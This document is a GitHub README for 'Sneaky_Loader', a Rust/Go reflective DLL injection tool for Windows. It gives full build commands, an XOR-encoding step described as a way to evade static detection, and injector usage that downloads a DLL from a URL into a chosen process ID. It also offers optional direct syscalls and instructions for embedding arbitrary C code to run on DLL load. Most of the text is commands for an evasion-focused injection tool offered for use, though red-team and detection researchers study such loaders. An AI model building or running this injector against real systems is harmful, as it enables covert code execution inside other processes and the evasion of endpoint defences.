# Sneaky_Loader
Custom loader - Rust/Go Dll Reflective Injection - Supports 32/64 bits but not ARM for the moment

# How to use it ?

1. Clone the repo
```
git clone <repo>
```

2. x32 - Compile the 32 bits dll
```
cd RustyLoader
rustup target add i686-pc-windows-msvc
cargo build --target=i686-pc-windows-msvc --release
```

2. x64 - Compile the 64 bits dll
```
cd RustyLoader
cargo build --release
```

3. x32 - Copy the compiled dll
```
Copy-Item .\target\i686-pc-windows-msvc\release\rusty_inject.dll -Destination ..\GogoInjector\
```

3. x64 - Copy the compiled dll
```
Copy-Item .\target\release\rusty_inject.dll -Destination ..\GogoInjector\
```

Optional - xor the dll to avoid static detection on memory inspection after the dll download. 

```
inject.go -encode "rusty_inject.dll"
```

A .enc version of the dll is produced. No need to specify to the injector that it is encoded, it will detect it by itself.

4. x32 - Compile the injector
```
cd GogoInjector
go get github.com/Binject/debug/pe
go get golang.org/x/sys/windows
$env:GOARCH="386"
go build .\inject.go
```

4. x64 - Compile the injector
```
cd GogoInjector
go get github.com/Binject/debug/pe
go get golang.org/x/sys/windows
$env:GOARCH="amd64"
go build .\inject.go
```

5. Test it

x32 : 
Spawn a 32 bits process and get its pid :
```
$process = Start-Process -FilePath "C:\Windows\SysWOW64\cmd.exe" -PassThru
$process.Id
```

x64 : 
Spawn a 64 bits process and get its pid :
```
$process = Start-Process -FilePath "C:\Windows\System32\cmd.exe" -PassThru
$process.Id
```

Inject the dll :

Usage :
```
.\inject.exe 
  -encode string
        path of the dll to encode
  -local string
        Local file path
  -pid int
        Process ID
  -s    direct syscall flag (only for 64 bits process)
  -url string
        URL of the file
```

Example
```
.\inject.exe -pid  21108 -url http://127.0.0.1:8080/rusty_inject.dll
```
![Alt text](/assets/injected2.png)

NOTE : direct syscall is supported on 64 bits. Use -s flag. Direct syscalls are resolved from an encoded SSN json database generated with https://github.com/maxspl/SSN_db
```
.\inject.exe -pid  21108 -url http://127.0.0.1:8080/rusty_inject.dll
```

6. Inject C program : from .c file 

- Add your C code in RustyLoader :
```
RustyLoader/
|-- Cargo.toml
|-- src/
    |-- lib.rs
    |-- loader.rs
|-- c_code.c
```

- Modify Cargo.toml
```
[dependencies]
ntapi = "0.4.0"
winapi = { version = "0.3", features = ["winuser"] }

[build-dependencies]
cc = "1.0"

[build]
rustc-flags = "-L native=target/release/ -l static:cdll"
```

- Create a build.rs file in RustyLoader :
```
RustyLoader/
|-- Cargo.toml
|-- src/
    |-- lib.rs
    |-- loader.rs
|-- c_code.c
|-- build.rs
```

Content :
```
fn main() {
    cc::Build::new()
        .file("c_code.c")
        .compile("cdll");
}
```
- Modify lib.rs :

```
extern crate winapi;
extern "C" {
    fn show_message();
}
```

```
if call_reason == DLL_PROCESS_ATTACH {
main_function_from_c_code()
}
```

6. Inject C program : from static library

- Compile c code as object file :
```
gcc -c c_code.c -o c_code.o
```

- Compile as static library  :
```
ar rcs staticlib.lib c_code.o 
```

- Add your static library to libs/ :
```
RustyLoader/
|-- Cargo.toml
|-- libs/
    |-- staticlib.lib
|-- src/
    |-- lib.rs
    |-- loader.rs
```

- Modify Cargo.toml
```
[package]
build = "build.rs"
```

- Create a build.rs file in RustyLoader :
```
RustyLoader/
|-- Cargo.toml
|-- libs/
    |-- staticlib.lib
|-- src/
    |-- lib.rs
    |-- loader.rs
|-- build.rs
```

Content :
```
fn main() {
    // Tell Cargo where to find the static library
    println!("cargo:rustc-link-search=./libs");

    // Tell Cargo to link our static library
    println!("cargo:rustc-link-lib=static=staticlib");
}

```
- Modify lib.rs :

```
extern "C" {
    fn show_message();
}
```

```
if call_reason == DLL_PROCESS_ATTACH {
main_function_from_c_code()
}
```

# How to use the debug version ?

The directory debug_RustyLoader contains a verbose version of the RustyLoader. 
It works in a slightly different way :

	- It is an exe, not a dll. 
	- It operates as an injector and also a loader.
	- It reads the dll named debug_dll.dll in /dll_to_inject .
	- It loads the raw dll in the self process memory and perfoms all the loading operations as RustyLoader would do but with verbose printed logs. Once loaded, it calls dllmain.

Put the dll to be tested in the directory debug_RustyLoader\dll_to_inject and name it debug_dll.dll.
```
cd debug_RustyLoader
cargo run --target=i686-pc-windows-msvc
```
![Alt text](/assets/injected_verbose.png)

# References
    - https://github.com/stephenfewer/ReflectiveDLLInjection
    - https://github.com/memN0ps/arsenal-rs/tree/main/rdi-rs
    - https://github.com/C-Sto/BananaPhone/tree/master